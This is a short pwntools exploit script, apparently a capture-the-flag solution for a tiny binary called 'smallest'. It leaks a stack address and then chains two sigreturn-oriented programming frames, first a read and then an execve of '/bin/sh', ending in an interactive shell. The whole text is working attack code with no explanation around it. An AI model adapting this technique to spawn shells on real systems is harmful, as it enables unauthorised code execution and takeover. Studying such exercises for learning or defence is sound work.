from pwn import *

p = process("./smallest")

context( arch='amd64', log_level='debug')

syscall_ret = 0x4000BE
start_addr = 0x4000B0

payload = p64(start_addr) * 3
p.send(payload)
p.send(b'\xb3')
p.recv(8)
stack_addr = u64(p.recv(8))
print("!11111")
log.success('Stack Address: ' + (hex(stack_addr)))

read = SigreturnFrame()
read.rax = 0x0
read.rdi = 0x0
read.rsi = stack_addr
read.rdx = 0x400
read.rsp = stack_addr
read.rip = syscall_ret

payload = flat(p64(start_addr) , p64(syscall_ret) ,bytes(read))
p.send(payload)
p.send(payload[8:8+15])

execve_srop = SigreturnFrame()
execve_srop.rax = 59
execve_srop.rdi = stack_addr + 0x120
execve_srop.rsi = 0x0
execve_srop.rdx = 0x0
execve_srop.rsp = stack_addr
execve_srop.rip = syscall_ret

frame_payload = flat(p64(start_addr) ,p64(syscall_ret) , bytes(execve_srop))
payload = flat(frame_payload ,(0x120 - len(frame_payload)) * b'\x00' ,b'/bin/sh\x00')
p.send(payload)
p.send(payload[8:8+15])

p.interactive()
